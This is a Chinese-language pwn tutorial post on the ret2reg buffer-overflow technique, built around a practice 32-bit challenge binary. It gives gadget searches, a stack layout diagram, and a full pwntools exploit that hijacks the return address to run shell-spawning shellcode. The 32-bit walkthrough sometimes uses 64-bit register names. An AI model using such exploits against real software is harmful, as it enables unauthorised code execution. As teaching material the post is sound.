---
title: Pwn-ret2reg
description: pwn第9部分学习Pwn-ret2reg
date: 2026-07-16 12:24:49
updated: 2026-07-16 12:24:49
image: https://images.cnblogs.com/cnblogs_com/blogs/860797/galleries/2492655/o_260716043407_Image_1782995576826_26.jpg
categories: [pwn]
tags: [栈溢出, ret2reg]
---

## Pwn-ret2reg

### 概念

`ret2reg`（Return to Register，返回到寄存器）是二进制漏洞利用（Pwn）中一种经典的缓冲区溢出攻击技术。

它的核心思想是：当你无法直接预测或硬编码 Shellcode 在内存中的具体地址（通常是因为开启了 ASLR 地址随机化），但**在函数返回时，恰好有一个寄存器指向了你的 Shellcode（或者指向被你控制的缓冲区）**，你就可以利用这个寄存器来跳转并执行你的恶意代码。

ret2reg更像是**ret2shellcode**的升级,也是入手**Stack_Feeding**的基础，学完ret2reg再去学习Stack_Feeding会更加好一些

---

#### 1. 为什么需要 ret2reg？

在最传统的缓冲区溢出中，攻击者会用 Shellcode 的确切物理地址去覆盖栈上的返回地址（Return Address）。但在现代操作系统中，栈地址通常是动态变化的（栈随机化）。

如果你不知道栈的确切地址，直接覆盖返回地址就会导致程序崩溃。此时，如果某个寄存器（如 `eax`, `ebx`, `esp` 等）正好保存了 Shellcode 的地址，`ret2reg` 就能完美绕过栈地址随机化的限制。

---

#### 2.ret2reg 的执行原理

实施 `ret2reg` 攻击通常分为以下几个步骤：

- **步骤一：注入 Shellcode** 将你的恶意代码（Shellcode）输入到目标程序的缓冲区中。
- **步骤二：寻找关键寄存器** 通过调试（如使用 GDB 或 pwndbg），观察在目标函数执行 `ret` 指令准备返回的瞬间，是否有哪个寄存器正好指向你存放 Shellcode 的缓冲区地址。
- **步骤三：寻找跳板指令 (Gadget)** 在程序的代码段（`.text`）或已加载的共享库（且地址未被完全随机化的地方）中，寻找形如 `jmp eax` 或 `call eax`（假设 `eax` 是那个指向 Shellcode 的寄存器）的汇编指令。这个指令的地址就是你的**跳板地址**。
- **步骤四：劫持控制流** 利用缓冲区溢出，将栈上的返回地址（Return Address）覆盖为**跳板指令的地址**。

---

#### 3.常见的使用场景与限制

- **最典型的代表：** `jmp esp`。在许多函数返回后，栈顶指针 `esp` 刚好指向返回地址的正下方。攻击者经常用 `jmp esp` 指令作为跳板，直接跳到紧跟在返回地址后面的 Shellcode 中去执行。
- **前提条件：** `ret2reg` 要想直接执行 Shellcode，通常要求存放 Shellcode 的内存区域（如栈或堆）具有**可执行权限 (Executable)**。如果目标程序开启了 NX（No-eXecute）/ DEP 保护，栈上的代码将无法执行，此时单纯的 `ret2reg` 会失效，需要结合 ROP（Return-Oriented Programming）链等高级技术先修改内存权限（如调用 `mprotect`），然后再进行跳转。

---

#### 4.流程动画

::alert{icon="tabler:files" color="var(--c-accent)" title="ret2reg原理动画"}

[点击跳转](https://gitee.com/ASUS_HACKED/cybersecurity/tree/比赛附件/HACKED笔记pwn/动画链接/NSSCTF-PWN/栈/ret2reg)

::

---

以下题目均为HACKED使用AI制作，如果有疑问的地方请询问

## ret2reg32

::alert{icon="tabler:files" color="var(--c-accent)" title="题目地址"}

[点击跳转题目下载](https://gitee.com/ASUS_HACKED/cybersecurity/tree/比赛附件/HACKED笔记pwn/题目)

::

###  0x01 程序分析

```bash
checksec ret2reg
```

![image-20260715175747568](https://img2024.cnblogs.com/blog/3726946/202607/3726946-20260716122337522-355294348.png)

未开启各种保护，那我们看看源码吧

---

### 0x02 函数分析

#### main函数-> 0x080492C2

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init(&argc);
  read_input();
  puts("Bye!");
  return 0;
}		
```

#### read_input函数 -> 08049230 漏洞函数

```c
int read_input()
{
  char s[32]; // [esp+Ch] [ebp-2Ch] BYREF
  ssize_t v2; // [esp+2Ch] [ebp-Ch]

  memset(s, 0, sizeof(s));
  printf("Enter your note: ");
  v2 = read(0, s, 0x100u);
  if ( strlen(s) <= 0x7F )
    strcpy(note, s);
  return puts("Note saved.");
}
```

观察可以发现出现了栈溢出漏洞，read向s数组读取0x100字节远远超过申请的空间,同时这题并没有出现/bin/sh等等这些关键的字符串

---

### 0x03 利用思路

#### 3.1 ret2reg 是什么

栈溢出后不能让 rip "自然" 跳到 shellcode（**CPU 不会自动跳**），必须**主动控制 rip** 让它跳到 shellcode 起点。

ret2reg = **找一个"能间接让 rip = 某个寄存器数值"的 gadget**。



ret2reg的思路就是找到能够让esp自然向下的指令，比如`jmp eax` 或 `call eax`

使用objdump查看程序反汇编，为什么不用IDA呢？因为IDA会将一些子函数的指令进行吞并导致缺失，所以我们需要两个都结合，或者使用HACKED的小工具ob.py来寻找继承了一些常用寻找方式，详细的话也请看HACKED的pwn工具文章吧

```bash
objdump -d -M intel ret2reg32
```

![image-20260716020834806](https://img2024.cnblogs.com/blog/3726946/202607/3726946-20260716122336731-1456672273.png)

或者使用ROPgadeget寻找这个链

```bash
$ ROPgadget --binary ret2reg32 | grep -E "push esp|jmp esp|call esp"
0x080490eb : push esp ; mov ebx, dword ptr [esp] ; ret
```

**关键**：ret 后 `rip = 旧 esp 数字 = 一个栈地址`。

### 

---

### 0x04 利用流程图

```asm
[buf 32B][local 8B][saved_ebx 4B][saved_ebp 4B][ret_addr 4B][shellcode]
offset 0  off 32    off 40         off 44         off 48       off 52
                                                    ↑
                                              覆盖为 0x080490eb
                                                          ↑
                                                    rip 跳到这里
```

---

### 0x05 payload构造

```python
JMP_ESP_GADGET = 0x080490eb

payload  = b'A' * 40           # buf(32) + 局部变量(8) = 40 字节
payload += b'CCCC'             # saved_ebx (无关)
payload += b'DDDD'             # saved_ebp (无关)
payload += p32(JMP_ESP_GADGET) # ret_addr = 0x080490eb
payload += shellcode           # 跟着 ret_addr 之后
```

---

### 0x06 完整的EXP

```python
from pwn import *

context(os = 'linux',arch = 'i386')
r = process('./ret2reg32')
offset   = 0x2C + 0x4
ret_addr = 0x080490EB
shellcode = asm(shellcraft.sh())
payload = b'a'*offset + p32(ret_addr)+ shellcode
r.recvuntil(b'Enter your note: ')
r.sendline(payload)

r.interactive()

```

---

### 0x07 一些常见の问题

#### 7.1 为什么 ret_addr = 0x080490eb 能跳到 shellcode？

**时序**（函数 ret 时，rsp 在 ret_addr 位置 ebp+4）：

```
函数 ret:
  rip = [rsp] = 0x080490eb
  rsp = ebp+8

0x080490eb: push esp
  [rsp-4] = rsp 数值 = ebp+8       ← 关键：把栈地址"埋"进 [ebp+4]
  rsp = ebp+4

0x080490ed: mov ebx, [esp]
  ebx = [rsp] = ebp+8 数字
  rsp 不变

0x080490f0: ret
  rip = [rsp] = [ebp+4] = ebp+8 数字   ← rip 跳到栈地址
  rsp = ebp+8
```

**结果**：rip 跳到 ebp+8 = ret_addr 之后 4 字节 = shellcode 起点。

----

#### 7.2 为什么不直接用 jmp esp 字节？

v1 binary 在 `.text` 段找不到 `jmp esp (0xff 0xe4)` 字节（v2 题源码里显式插入了 jmp esp 字节才有）。

但 binary 在 `_start` 末尾凑巧有 `push esp; mov ebx, [esp]; ret` 这个 gadget——**这就是 ret2reg 实战的样子**：用 push esp 间接实现"伪 jmp esp"。

---

#### 7.3 为什么不用 call eax？

call eax 思路：

- read() 返回后 eax = 0x100（数字），不是 shellcode 地址
- 要用 call eax 得先用 ROP 链把 eax 改成 shellcode 地址
- 32 位 binary 也没有 `pop eax; ret` gadget

所以 call eax 在这道题走不通。

---

#### 7.4 栈地址 \x00 怎么办？

本题用 `read()` 写入，不依赖 strcpy 截止。payload 里**可以有 \x00**，但实测 `0x080490eb` 的 little-endian 是 `\xeb\x90\x04\x08` 不含 \x00（高位是 0x00 但 read 不停 \x00）。

---

### 0x08 总结

| 步骤         | 关键点                                                       |
| ------------ | ------------------------------------------------------------ |
| 1. 漏洞      | `read(0, buf, 0x100)` 读 256 字节到 32 字节 buffer，溢出 224 字节 |
| 2. 保护      | NX 关闭、PIE 关闭、canary 关闭 → ret2shellcode 路线可用      |
| 3. 找 gadget | `0x080490eb: push esp; mov ebx, [esp]; ret`（间接 jmp esp）  |
| 4. payload   | 40 字节 padding + 4 saved_ebx + 4 saved_ebp + 4 ret_addr + shellcode |
| 5. 触发      | 函数 ret → rip 跳到 0x080490eb → push esp 把 esp 数值埋栈 → ret 弹出当 rip → 命中 shellcode |

**核心 takeaway**：

- ret2reg 本质是 "找一条能让 rip = 某个寄存器数值的 gadget"
- 实战中直接的 `jmp esp` 很少见，更多是 `push esp; ...; ret` 这种"绕路"gadget
- 32 位下找 ret2reg gadget 用 `ROPgadget | grep "push esp"` / `"jmp esp"` / `"call esp"`

---